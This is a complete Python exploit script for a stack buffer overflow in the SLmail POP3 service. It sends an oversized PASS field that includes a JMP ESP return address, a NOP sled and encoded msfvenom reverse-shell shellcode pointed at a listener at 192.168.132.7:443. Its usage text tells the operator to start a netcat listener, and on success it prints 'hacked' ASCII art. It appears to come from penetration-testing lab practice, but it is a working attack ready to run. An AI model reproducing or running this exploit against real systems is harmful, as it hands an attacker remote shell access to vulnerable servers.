#!/usr/bin/python
# coding=utf-8

import time, struct, sys
import socket as so

anonymous = (
"\n"
"  █████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█\n"
"  ██▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█\n"
"  █▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  ██▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  █▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█\n"
"  ██████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█\n"
"  █▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  ██▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  █▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  ███▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█\n"
"  ███▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██\n"
"  ███▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██\n"
"  ██▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██\n"
"  ██▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██\n"
"  ███▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██\n"
"  ███▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███\n"
"  ████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███\n"
"  █████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████\n"
"  █████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████\n"
"  ██████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████\n"
"  ███████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████\n"
"  ████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████\n"
"  █████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████\n"
"  █████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬█████████\n"
"  █████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████\n")

hacked = (        
"    | |              | |          | |\n"
"    | |__   __ _  ___| | _____  __| |\n"
"    | '_ \ / _` |/ __| |/ / _ \/ _` |\n"
"    | | | | (_| | (__|   <  __/ (_| |\n"
"    |_| |_|\__,_|\___|_|\_\___|\__,_|\n\n")

achars = 'A'*2606

#JMP ESP address is 5F4A358F
jmpesp = '\x8f\x35\x4a\x5f'

#NOP Sled
nops = '\x90'*16

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.132.7 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai - THIS MUST BE REPLACED WITH YOUR MSFVENOM OUTPUT
buf =  ""
buf += "\xbd\xc7\xd5\x90\xc9\xdb\xce\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x52\x83\xea\xfc\x31\x6a\x0e\x03\xad\xdb\x72"
buf += "\x3c\xcd\x0c\xf0\xbf\x2d\xcd\x95\x36\xc8\xfc\x95\x2d"
buf += "\x99\xaf\x25\x25\xcf\x43\xcd\x6b\xfb\xd0\xa3\xa3\x0c"
buf += "\x50\x09\x92\x23\x61\x22\xe6\x22\xe1\x39\x3b\x84\xd8"
buf += "\xf1\x4e\xc5\x1d\xef\xa3\x97\xf6\x7b\x11\x07\x72\x31"
buf += "\xaa\xac\xc8\xd7\xaa\x51\x98\xd6\x9b\xc4\x92\x80\x3b"
buf += "\xe7\x77\xb9\x75\xff\x94\x84\xcc\x74\x6e\x72\xcf\x5c"
buf += "\xbe\x7b\x7c\xa1\x0e\x8e\x7c\xe6\xa9\x71\x0b\x1e\xca"
buf += "\x0c\x0c\xe5\xb0\xca\x99\xfd\x13\x98\x3a\xd9\xa2\x4d"
buf += "\xdc\xaa\xa9\x3a\xaa\xf4\xad\xbd\x7f\x8f\xca\x36\x7e"
buf += "\x5f\x5b\x0c\xa5\x7b\x07\xd6\xc4\xda\xed\xb9\xf9\x3c"
buf += "\x4e\x65\x5c\x37\x63\x72\xed\x1a\xec\xb7\xdc\xa4\xec"
buf += "\xdf\x57\xd7\xde\x40\xcc\x7f\x53\x08\xca\x78\x94\x23"
buf += "\xaa\x16\x6b\xcc\xcb\x3f\xa8\x98\x9b\x57\x19\xa1\x77"
buf += "\xa7\xa6\x74\xd7\xf7\x08\x27\x98\xa7\xe8\x97\x70\xad"
buf += "\xe6\xc8\x61\xce\x2c\x61\x0b\x35\xa7\x4e\x64\xb1\x30"
buf += "\x27\x77\xb9\x3f\x0c\xfe\x5f\x55\x62\x57\xc8\xc2\x1b"
buf += "\xf2\x82\x73\xe3\x28\xef\xb4\x6f\xdf\x10\x7a\x98\xaa"
buf += "\x02\xeb\x68\xe1\x78\xba\x77\xdf\x14\x20\xe5\x84\xe4"
buf += "\x2f\x16\x13\xb3\x78\xe8\x6a\x51\x95\x53\xc5\x47\x64"
buf += "\x05\x2e\xc3\xb3\xf6\xb1\xca\x36\x42\x96\xdc\x8e\x4b"
buf += "\x92\x88\x5e\x1a\x4c\x66\x19\xf4\x3e\xd0\xf3\xab\xe8"
buf += "\xb4\x82\x87\x2a\xc2\x8a\xcd\xdc\x2a\x3a\xb8\x98\x55"
buf += "\xf3\x2c\x2d\x2e\xe9\xcc\xd2\xe5\xa9\xfd\x98\xa7\x98"
buf += "\x95\x44\x32\x99\xfb\x76\xe9\xde\x05\xf5\x1b\x9f\xf1"
buf += "\xe5\x6e\x9a\xbe\xa1\x83\xd6\xaf\x47\xa3\x45\xcf\x4d"

overflow = achars + jmpesp + nops + buf

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   print "Make sure to use netcat first. Example: nc -nlvp 443"
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER jesse' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + overflow + '\r\n')
   print "\n[+] Completed. Check netcat for shell."
   print ("\033[1;32;48m" + anonymous)
   print hacked
except:
   print "[+] Unable to connect to SLmail. Check your IP address and port"
   sys.exit()
